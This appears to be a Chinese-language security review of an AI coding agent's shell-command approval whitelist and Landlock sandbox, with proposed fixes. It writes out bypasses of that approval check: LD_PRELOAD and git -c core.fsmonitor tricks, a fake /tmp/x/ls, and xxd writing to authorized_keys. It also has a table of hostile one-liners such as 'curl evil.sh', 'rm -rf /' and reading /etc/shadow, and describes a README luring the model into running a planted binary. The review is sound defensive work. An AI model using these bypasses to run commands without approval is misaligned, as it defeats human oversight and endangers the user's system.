<span class="w">            </span><span class="nb">None</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="c1">// 3. 按 basename 判定</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">program</span><span class="p">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="n">next</span><span class="p">().</span><span class="n">unwrap_or</span><span class="p">(</span><span class="n">program</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// 4. git 走子命令白名单，其余走二进制白名单</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;git&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">git_subcommand_is_read_only</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">tokens</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">TRUSTED_BINARIES</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">program</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>


六条判定分别是：非空、无控制操作符、跳过环境变量、取 basename、git 特判、查白名单。

前两条是必要的。控制操作符列表里最重要的是 <code>|</code>、<code>&amp;</code>、<code>;</code>、<code>&lt;</code>、<code>&gt;</code>——分别对应管道、后台/与、命令分隔、输入重定向、输出重定向。反引号和 <code>$</code> 挡的是命令替换（<code>$(...)</code> 与反引号包裹）。<code>(</code> 和 <code>)</code> 挡的是子 shell。<code>\n</code> 挡的是「第一行看着无害，第二行是 <code>rm -rf /</code>」。

这一层做得对，而且测试覆盖了主要形态：
<div class="codehilite"><pre><span></span><code><span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">is_trusted_command</span><span class="p">(</span><span class="s">&quot;echo hi &gt; f&quot;</span><span class="p">));</span>
<span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">is_trusted_command</span><span class="p">(</span><span class="s">&quot;ls | rm&quot;</span><span class="p">));</span>
<span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">is_trusted_command</span><span class="p">(</span><span class="s">&quot;ls &amp;&amp; rm&quot;</span><span class="p">));</span>
<span class="fm">assert!</span><span class="p">(</span><span class="o">!</span><span class="n">is_trusted_command</span><span class="p">(</span><span class="s">&quot;$(rm x)&quot;</span><span class="p">));</span>
</code></pre></div>


但后四条各有各的问题。接下来三节分别拆。
<h2>只读白名单的四个漏洞</h2>

<code>TRUSTED_BINARIES</code> 有 62 个条目，注释的承诺是「纯粹只读、从不写入、从不 spawn 其他程序」。至少有四个成员违反了这个承诺：
<div class="table-scroll"><table>
<thead>
<tr>
<th>命令</th>
<th>写文件的写法</th>
<th>为什么算「可信」的误判</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sort</code></td>
<td><code>sort -o out.txt in.txt</code></td>
<td><code>-o</code> 直接把结果写进文件</td>
</tr>
<tr>
<td><code>tree</code></td>
<td><code>tree -o out.txt</code></td>
<td><code>-o</code> 同上，tree 有输出到文件选项</td>
</tr>
<tr>
<td><code>xxd</code></td>
<td><code>xxd -r in.hex out.bin</code></td>
<td><code>-r</code> 反向转换，把 hex 还原成二进制并写盘</td>
</tr>
<tr>
<td><code>date</code></td>
<td><code>date -s "2026-01-01"</code></td>
<td><code>-s</code> 设置系统时间（需要权限）</td>
</tr>
</tbody>
</table></div>

其中 <code>sort -o</code> 和 <code>tree -o</code> 是标准用法，不需要任何特殊权限，在任何用户下都能写文件。而 <code>xxd -r</code> 能写出<strong>任意二进制内容</strong>——这意味着一个「只读」白名单条目实际上可以提供完整的文件写入能力：
<div class="codehilite"><pre><span></span><code>xxd -r payload.hex /home/user/.ssh/authorized_keys
</code></pre></div>


这条命令不含任何控制操作符，程序名是 <code>xxd</code>，在白名单里，参数是普通文件名。<code>is_trusted_command</code> 返回 true，<code>OnRequest</code> 策略下不需要审批。

<code>date -s</code> 的后果更微妙：它不写文件，但会改变系统时间，足以破坏依赖时间的证书校验、日志顺序、构建缓存。

修法不是把四个条目删掉——那会连带砍掉它们的正常用法（<code>sort</code> 排序、<code>tree</code> 看目录树都是好工具）。正确做法是<strong>从「按程序名判定」升级成「按程序名加参数判定」</strong>：
<div class="codehilite"><pre><span></span><code><span class="k">fn</span><span class="w"> </span><span class="nf">is_read_only_invocation</span><span class="p">(</span><span class="n">program</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="kt">str</span><span class="p">])</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="s">&quot;sort&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="s">&quot;tree&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">!</span><span class="n">args</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">a</span><span class="o">|</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;-o&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&quot;-o&quot;</span><span class="p">)),</span>
<span class="w">        </span><span class="s">&quot;xxd&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">!</span><span class="n">args</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">a</span><span class="o">|</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;-r&quot;</span><span class="p">),</span>
<span class="w">        </span><span class="s">&quot;date&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">!</span><span class="n">args</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">a</span><span class="o">|</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;-s&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="s">&quot;--set&quot;</span><span class="p">)),</span>
<span class="w">        </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">TRUSTED_BINARIES</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">program</span><span class="p">),</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


这个改动很小，但它把安全模型从「信任程序」变成「信任调用」。后者的语义才是对的：<code>sort</code> 不是只读的，「<code>sort</code> 不带 <code>-o</code>」才是只读的。
<h2>按 basename 判定：<code>/tmp/ls</code> 也算可信</h2>

第二处问题是 <code>program.rsplit('/').next()</code>：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">program</span><span class="p">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">).</span><span class="n">next</span><span class="p">().</span><span class="n">unwrap_or</span><span class="p">(</span><span class="n">program</span><span class="p">);</span>
</code></pre></div>


它的本意是「<code>/bin/ls</code> 和 <code>ls</code> 是同一个程序」。但它同时也让 <code>/tmp/evil/ls</code> 变成了「可信的 <code>ls</code>」——只要文件名是 <code>ls</code>，不管这个文件是谁写的、内容是什么。

构造一个攻击不需要什么技巧：
<div class="codehilite"><pre><span></span><code>/tmp/x/ls -la
</code></pre></div>


不含控制操作符，basename 是 <code>ls</code>，在白名单里，判定为可信，不询问就执行。而 <code>/tmp/x/ls</code> 可以是任意脚本。

这个洞的严重性取决于攻防假设。如果假设是「模型是善意的、只是偶尔犯错」，那这个洞无所谓——模型不会去执行 <code>/tmp/x/ls</code>。但如果假设是「仓库里可能有一个恶意文件，模型可能读到它并照着执行」，那这就是一条完整的远程代码执行路径：往仓库里放一个叫 <code>ls</code> 的可执行文件，在 <code>README</code> 里诱导模型跑它。

修法有两档：

<strong>弱一点：</strong> 只对「没有路径分隔符」的命令做 basename 匹配。带 <code>/</code> 的一律要求审批。
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">program</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="sc">&#39;/&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">   </span><span class="c1">// 显式路径一律不可信</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">program</span>
<span class="p">};</span>
</code></pre></div>


这个改法会误伤 <code>/bin/ls</code> 这种绝对路径的正常用法——但它只是多问一次，不是不能用。fail closed 的方向是对的。

<strong>强一点：</strong> 校验路径的「可信根」。只有 <code>/bin</code>、<code>/usr/bin</code>、<code>/usr/local/bin</code> 下的程序可以按 basename 免问，其他路径一律问。这样既保留了 <code>/bin/ls</code> 的便利，又堵住了 <code>/tmp</code>。代价是要处理 <code>PATH</code> 查找、软链接（<code>/bin</code> 常常链到 <code>/usr/bin</code>）、以及 Windows 上没有 <code>/bin</code> 的事实。

对一个跨平台工具，第一档更现实。第二档适合在 Linux 上做严格模式。
<h2>环境变量前缀：LD_PRELOAD 那一行</h2>

第三处问题是「跳过前置的 <code>KEY=VALUE</code>」：
<div class="codehilite"><pre><span></span><code><span class="nb">Some</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">is_env_assignment</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">continue</span><span class="p">,</span>
</code></pre></div>


跳过本身是对的——<code>FOO=bar ls</code> 和 <code>ls</code> 应该同样处理。但它只检查了「变量名合法」，没检查<strong>变量值会不会改变执行行为</strong>。

最直接的例子是 <code>LD_PRELOAD</code>：
<div class="codehilite"><pre><span></span><code>LD_PRELOAD=/tmp/evil.so ls
</code></pre></div>


程序名是 <code>ls</code>，在白名单里，参数是 <code>-la</code> 或什么都没有，判定为只读可信，不询问就执行。而 <code>LD_PRELOAD</code> 会让动态链接器在 <code>ls</code> 启动前先加载 <code>/tmp/evil.so</code>——这等于在 <code>ls</code> 进程里执行任意代码，权限和 <code>ls</code> 完全相同（也就是你的全部权限）。

同类变量还有：
<div class="table-scroll"><table>
<thead>
<tr>
<th>变量</th>
<th>作用</th>
<th>风险</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>LD_PRELOAD</code></td>
<td>预加载共享库</td>
<td>任意代码执行</td>
</tr>
<tr>
<td><code>LD_LIBRARY_PATH</code></td>
<td>改变库搜索路径</td>
<td>劫持依赖库</td>
</tr>
<tr>
<td><code>GIT_SSH_COMMAND</code></td>
<td>指定 git 的 ssh 命令</td>
<td>只在网络操作生效，但可执行任意程序</td>
</tr>
<tr>
<td><code>PAGER</code> / <code>GIT_PAGER</code></td>
<td>指定分页器</td>
<td><code>git log</code> 会 spawn 它</td>
</tr>
<tr>
<td><code>BASH_ENV</code></td>
<td>非交互 bash 启动时读的文件</td>
<td>任意代码执行</td>
</tr>
<tr>
<td><code>NODE_OPTIONS</code></td>
<td>Node 启动参数</td>
<td><code>--require /tmp/x.js</code></td>
</tr>
</tbody>
</table></div>

<code>PAGER</code> 这一项特别有意思：<code>git log</code> 在 <code>TRUSTED_GIT_SUBCOMMANDS</code> 里，是免问的只读命令。但如果用户环境里 <code>PAGER</code> 指向一个脚本，<code>git log</code> 就会 spawn 这个脚本。所以「git log 是只读的」这个判断依赖于<strong>环境没有被污染</strong>，而环境恰恰是模型能改的（通过前置赋值）。

修法：只允许「安全变量」前缀，或者干脆禁止任何环境变量前缀。
<div class="codehilite"><pre><span></span><code><span class="c1">// 保守：不允许前置赋值</span>
<span class="nb">Some</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">is_env_assignment</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
</code></pre></div>


代价是 <code>FOO=bar ./test</code> 这种用法每次都要问。对 Agent 场景可以接受——模型完全可以用 <code>export</code> 写在一条命令里，而那条命令本来就该问。
<h2>git 子命令白名单为什么挡不住别名</h2>

<code>git</code> 的处理是整套判定里最复杂的一段：
<div class="codehilite"><pre><span></span><code><span class="k">fn</span><span class="w"> </span><span class="nf">git_subcommand_is_read_only</span><span class="o">&lt;&#39;</span><span class="na">a</span><span class="o">&gt;</span><span class="p">(</span><span class="n">tokens</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="k">impl</span><span class="w"> </span><span class="nb">Iterator</span><span class="o">&lt;</span><span class="n">Item</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;&#39;</span><span class="na">a</span><span class="w"> </span><span class="kt">str</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">VALUE_FLAGS</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="kt">str</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="p">[</span><span class="s">&quot;-C&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;--git-dir&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;--work-tree&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;--namespace&quot;</span><span class="p">];</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">pending_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">pending_value</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">pending_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">token</span><span class="p">.</span><span class="n">starts_with</span><span class="p">(</span><span class="sc">&#39;-&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">VALUE_FLAGS</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="n">pending_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">TRUSTED_GIT_SUBCOMMANDS</span><span class="p">.</span><span class="n">contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">token</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kc">false</span>
<span class="p">}</span>
</code></pre></div>


<code>VALUE_FLAGS</code> 的作用是跳过「带值的全局 flag」的下一个 token。没有它，<code>git -C /repo status</code> 会把 <code>/repo</code> 当成子命令，判定失败。有了它，<code>/repo</code> 被跳过，<code>status</code> 被正确识别。测试里覆盖了这个 case。

但这套逻辑有三个洞。

<strong>洞一：<code>git -c</code> 的值可以指定任意程序。</strong> <code>-c</code> 在 <code>VALUE_FLAGS</code> 里，所以它的值被跳过，然后 <code>status</code> 被判定为只读：
<div class="codehilite"><pre><span></span><code>git -c core.fsmonitor=/tmp/evil.sh status
</code></pre></div>


<code>core.fsmonitor</code> 是 git 会<strong>主动执行</strong>的配置项（每次检查工作区状态时调用）。所以这条「只读」命令会执行 <code>/tmp/evil.sh</code>。同类配置还有 <code>core.editor</code>、<code>core.pager</code>、<code>diff.external</code>、<code>filter.*.clean</code>。

<strong>洞二：<code>--exec-path</code> 不在 <code>VALUE_FLAGS</code> 里，但它以 <code>-</code> 开头所以被 <code>continue</code> 跳过。</strong> 于是：
<div class="codehilite"><pre><span></span><code>git --exec-path=/tmp status
</code></pre></div>


被判为只读，而 git 会从 <code>/tmp</code> 里找 <code>git-status</code> 来执行。

<strong>洞三，也是最根本的：git 别名。</strong> 如果用户的 <code>~/.gitconfig</code> 里有：
<div class="codehilite"><pre><span></span><code><span class="k">[alias]</span>
<span class="w">    </span><span class="na">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">!rm -rf /tmp/x</span>
</code></pre></div>


那么 <code>git status</code> 会被 git 展开成 <code>!rm -rf /tmp/x</code> 并交给 shell 执行。判定函数看到的子命令是 <code>status</code>，在白名单里，于是免问执行——而实际跑的是完全不同的东西。

第三个洞的解决办法只有一条：<strong>不看别名，直接看 git 真正会做什么</strong>。可以用 <code>git config --get alias.status</code> 先查一遍，或者更简单——把 <code>git</code> 从「免问白名单」里整个拿掉。只读 git 命令的收益（少问几次）远小于这三个洞的风险，尤其 <code>git status</code> 后面跟着的往往还有 <code>git diff</code>、<code>git log</code>，全都可以用同样方式劫持。

一个折中方案：把 git 的可信判定改成「必须是 <code>git &lt;sub&gt;</code> 形式，且不含任何 <code>-c</code> / <code>--exec-path</code> / <code>--config-env</code>，且通过 <code>git config --get alias.&lt;sub&gt;</code> 确认没有别名」。三条都满足才免问。这个逻辑大约 20 行，但需要额外 spawn 一次 git——对「免问」这个目标来说，成本已经高到不值得了。
<h2>元字符屏蔽：那九个字符是必要的</h2>

回到第一节的判定。九个字符的屏蔽是整套逻辑里最有效的一条，值得单独说清它的完备性。
<div class="table-scroll"><table>
<thead>
<tr>
<th>字符</th>
<th>挡住的构造</th>
<th>如果漏了会怎样</th>
</tr>
</thead>
<tbody>
<tr>
<td>竖线</td>
<td>管道</td>
<td><code>ls \| rm -rf /</code></td>
</tr>
<tr>
<td><code>&amp;</code></td>
<td>后台、逻辑与</td>
<td><code>ls &amp;&amp; curl evil.sh</code></td>
</tr>
<tr>
<td><code>;</code></td>
<td>命令分隔</td>
<td><code>ls; rm -rf /</code></td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>输入重定向</td>
<td><code>cat &lt; /etc/shadow</code></td>
</tr>
<tr>
<td><code>&gt;</code></td>
<td>输出重定向</td>
<td><code>echo x &gt; ~/.bashrc</code></td>
</tr>
<tr>
<td>反引号</td>
<td>命令替换</td>
<td>ls 后跟反引号包裹的 rm</td>
</tr>
<tr>
<td><code>$</code></td>
<td>变量、命令替换</td>
<td><code>ls $(rm -rf /)</code></td>
</tr>
<tr>
<td><code>(</code> <code>)</code></td>
<td>子 shell</td>
<td><code>(rm -rf /)</code></td>
</tr>
<tr>
<td>换行</td>
<td>多行命令</td>
<td>第一行 <code>ls</code>，第二行 <code>rm -rf /</code></td>
</tr>
</tbody>
</table></div>

这套屏蔽的关键在于：<strong>它是在「按空白切词」之前做的，针对的是整条命令字符串</strong>。所以不管这些字符出现在哪个位置（引号里、单词中间），都会被拦。这比「先切词再检查每个 token」可靠得多，因为引号和转义会让切词结果和 shell 的真实解析不一致。

但要说清它不挡什么：
<ul>
<li>反斜杠没挡——<code>\rm</code> 在 shell 里就是 <code>rm</code>，但 <code>is_trusted_command</code> 看到的 program 是 <code>\rm</code>，不在白名单里，所以判不可信。方向是安全的，只是会误报</li>
<li><code>#</code>（注释）和引号都没挡——注释不影响执行，引号本身不构成危险，引号里的内容一旦含元字符就会被挡</li>
</ul>

所以这九个字符的组合是够用的。真正的风险不在元字符，而在前面三节讲的「程序身份的判定」——元字符挡的是「一条命令做多件事」，而 <code>sort -o</code>、<code>/tmp/ls</code>、<code>LD_PRELOAD</code> 都是「一条命令做一件事，但那件事不是你以为的」。
<h2>Landlock：不引入任何 crate 的内核沙箱</h2>

前四道闸门都在应用层。第五道在<strong>内核层</strong>，而且它的实现方式值得单独拆——因为它没有引入任何依赖。

Linux 5.13 引入的 Landlock 是一个「非特权进程自我限制」的机制：进程可以给自己装一套规则，声明「我只能访问这些路径的这些权限」，安装之后<strong>无法撤销</strong>，且对子进程继承。这正好是沙箱需要的东西。

NanoHermes 直接用裸系统调用实现，三个调用号硬编码：
<div class="codehilite"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">SYS_LANDLOCK_CREATE_RULESET</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">444</span><span class="p">;</span>
<span class="k">const</span><span class="w"> </span><span class="n">SYS_LANDLOCK_ADD_RULE</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">445</span><span class="p">;</span>
<span class="k">const</span><span class="w"> </span><span class="n">SYS_LANDLOCK_RESTRICT_SELF</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">446</span><span class="p">;</span>
</code></pre></div>


这三个号在 x86_64 和 aarch64 上是相同的（Landlock 的设计者特意让它们跨架构一致），所以不需要按架构分支。这也是为什么代码里的 <code>cfg</code> 只按 <code>target_os = "linux"</code> 和两个架构开关，不处理 armv7、riscv 等。

它同时还需要一个 prctl：
<div class="codehilite"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">PR_SET_NO_NEW_PRIVS</span><span class="p">:</span><span class="w"> </span><span class="kt">usize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">38</span><span class="p">;</span>
</code></pre></div>


这个必须最先做，因为 Landlock 的规则集只能在 <code>no_new_privs</code> 下生效——否则一个 setuid 程序就能绕过限制。
<h2>pre_exec 里能做什么，不能做什么</h2>

沙箱必须装在<strong>子进程 fork 之后、exec 之前</strong>。Rust 给的入口是 <code>CommandExt::pre_exec</code>：
<div class="codehilite"><pre><span></span><code><span class="n">cmd</span><span class="p">.</span><span class="n">pre_exec</span><span class="p">(</span><span class="k">move</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">apply</span><span class="p">(</span><span class="n">handled</span><span class="p">,</span><span class="w"> </span><span class="n">abi</span><span class="p">,</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">as_c_str</span><span class="p">(),</span><span class="w"> </span><span class="n">ws</span><span class="p">.</span><span class="n">as_deref</span><span class="p">())</span>
<span class="w">        </span><span class="p">.</span><span class="n">map_err</span><span class="p">(</span><span class="n">std</span><span class="p">::</span><span class="n">io</span><span class="p">::</span><span class="n">Error</span><span class="p">::</span><span class="n">from_raw_os_error</span><span class="p">)</span>
<span class="p">});</span>
</code></pre></div>


这段闭包运行在 fork 出来的子进程里，此时整个进程只有一个线程（fork 只复制调用线程），所有其他线程的锁状态都是不确定的。这意味着闭包里<strong>绝对不能</strong>：
<ul>
<li>分配内存（<code>malloc</code> 可能持有父进程某把锁）</li>
<li>获取任何锁（那把锁可能正被父进程另一个线程持有）</li>
<li>调用任何非 async-signal-safe 的函数</li>
<li>做格式化输出、<code>println!</code>、panic（panic 会走格式化，可能分配）</li>
</ul>

代码里的实现严格守住了这条线：<code>apply</code> 只用栈上的 <code>RulesetAttr</code> 和 <code>PathBeneathAttr</code> 两个 <code>#[repr(C)]</code> 结构体，只调 <code>syscall</code>，失败时返回 errno 而不是构造字符串。这一行的注释也写明了：
<div class="codehilite"><pre><span></span><code><span class="c1">// SAFETY: the closure runs in the freshly forked child before `exec`;</span>
<span class="c1">// it issues raw syscalls and touches only stack-allocated structs, so</span>
<span class="c1">// it performs no allocation and takes no locks.</span>
</code></pre></div>


这是整个沙箱实现里最容易写错的地方。一个很自然的写法是「失败时 <code>format!</code> 一个错误消息」——那就会在 fork 后的子进程里 <code>malloc</code>，在父进程高并发时偶发死锁。表现出来是「命令偶尔卡住」，几乎无法定位。

另一个细节是 <code>CString</code> 的预分配：
<div class="codehilite"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CString</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">).</span><span class="n">expect</span><span class="p">(</span><span class="s">&quot;literal has no NUL&quot;</span><span class="p">);</span>
<span class="kd">let</span><span class="w"> </span><span class="n">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CString</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="n">workspace</span><span class="p">.</span><span class="n">as_os_str</span><span class="p">().</span><span class="n">as_bytes</span><span class="p">())</span>
<span class="w">    </span><span class="p">.</span><span class="n">map_err</span><span class="p">(</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;workspace path {workspace:?} contains a NUL byte&quot;</span><span class="p">))</span><span class="o">?</span><span class="p">;</span>
</code></pre></div>


两个 <code>CString</code> 在 <code>attach</code> 时就构造好，被 <code>move</code> 进闭包。所以闭包里只有 <code>as_c_str()</code>，没有分配。这个「把所有准备工作提前到 fork 之前」的模式是 <code>pre_exec</code> 的正确用法。
<h2>ABI 版本与掩码：为什么权限要按版本裁剪</h2>

Landlock 是随内核演进的。每个版本增加新的权限位，而传入未知位会导致 <code>EINVAL</code>：
<div class="codehilite"><pre><span></span><code><span class="k">fn</span><span class="w"> </span><span class="nf">handled_fs_bits</span><span class="p">(</span><span class="n">abi</span><span class="p">:</span><span class="w"> </span><span class="kt">u32</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">u64</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">bits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ALL_FS</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">bits</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">!</span><span class="n">FS_REFER</span><span class="p">;</span><span class="w">      </span><span class="c1">// ABI 2 才有跨目录 rename</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">bits</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">!</span><span class="n">FS_TRUNCATE</span><span class="p">;</span><span class="w">   </span><span class="c1">// ABI 3 才有 truncate</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">abi</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">bits</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">!</span><span class="n">FS_IOCTL_DEV</span><span class="p">;</span><span class="w">  </span><span class="c1">// ABI 5 才有设备 ioctl</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="n">bits</span>
<span class="p">}</span>
</code></pre></div>


这个裁剪不是可选的优化，是必须的：在 ABI 1 的内核上传 <code>FS_TRUNCATE</code> 位，<code>create_ruleset</code> 直接返回 <code>EINVAL</code>，整个沙箱装不上。而「装不上」在这里等于「命令不能跑」（下一节讲为什么），所以裁剪逻辑错了的表现是「所有命令都失败」。

同样，结构体大小也要按版本给：
<div class="codehilite"><pre><span></span><code><span class="k">fn</span><span class="w"> </span><span class="nf">ruleset_size</span><span class="p">(</span><span class="n">abi</span><span class="p">:</span><span class="w"> </span><span class="kt">u32</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">usize</span><span class="w"> </span><span class="p">{</span>
